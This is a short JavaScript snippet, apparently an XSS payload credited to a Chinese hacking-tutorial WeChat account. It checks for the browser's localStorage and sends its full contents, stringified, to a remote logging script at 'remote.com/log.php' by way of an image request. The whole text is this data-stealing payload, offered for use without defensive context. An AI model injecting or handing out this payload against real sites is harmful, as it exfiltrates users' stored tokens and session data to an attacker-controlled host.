if ('localStorage' in window && window['localStorage'] !== null) {
    new Image().src = 'http://remote.com/log.php?localStorage='+JSON.stringify(window['localStorage']);
}

//参考来源：微信公众号：HACK学习呀